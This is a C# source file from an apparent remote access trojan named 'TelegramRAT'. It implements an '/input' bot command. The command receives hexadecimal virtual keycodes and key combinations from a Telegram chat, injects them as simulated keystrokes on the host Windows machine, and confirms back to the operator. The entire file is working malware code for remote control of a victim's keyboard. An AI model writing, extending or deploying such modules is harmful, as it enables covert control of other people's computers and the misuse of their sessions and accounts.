using Telegram.Bot;
using WindowsInput;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.Remote;

public class InputCommand(ITelegramBotClient botClient, IBotNotificationService notificationService) : AbstractBotCommand
{
    public override string Command => "input";
    public override string Description =>
        "Simulate keyboard input with virtual keycode, expressed in hexadecimal\n\n" +
        "List of virtual keycodes:\n" +
        "LBUTTON = 1\nRBUTTON = 2\nCANCEL = 3\nMIDBUTTON = 4\nBACKSPACE = 8\n" +
        "TAB = 9\nCLEAR = C\nENTER = D\nSHIFT = 10\nCTRL = 11\nALT = 12\n" +
        "PAUSE = 13\nCAPSLOCK = 14\nESC = 1B\nSPACE = 20\nPAGEUP = 21\nPAGEDOWN = 22\n" +
        "END = 23\nHOME = 24\nLEFT = 25\nUP = 26\nRIGHT = 27\nDOWN = 28\n\n0..9 = 30..39\n" +
        "A..Z = 41..5a\nF1..F24 = 70..87\n\n" +
        "<a href=\"https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\">See all keycodes</a>\n\n" +
        "To send combination of keys, join them with plus: 11+43 (ctrl+c)\n";
    public override int ArgsCount => -2;
    public override string Example => "/input 48 45 4c 4c 4f (hello)";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        await Task.Run(async () =>
        {
            try
            {
                KeyboardSimulator keyboardSimulator = new KeyboardSimulator(new InputSimulator());
                foreach (string arg in model.Args)
                {
                    if (arg.Contains('+'))
                    {
                        List<int> modifiedKeys = new List<int>();
                        foreach (string vk in arg.Split('+'))
                        {
                            modifiedKeys.Add(int.Parse(vk, global::System.Globalization.NumberStyles.HexNumber));
                        }
                        keyboardSimulator.ModifiedKeyStroke(new int[] { modifiedKeys[0] }, modifiedKeys.Skip(1));
                    }
                    else
                    {
                        keyboardSimulator.KeyPress(int.Parse(arg, global::System.Globalization.NumberStyles.HexNumber));
                    }
                }
                await botClient.SendMessage(model.Message.Chat.Id, "Sended!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            }
            catch (Exception ex)
            {
                await notificationService.ReportExceptionAsync(model.Message, ex);
            }
        });
    }
}
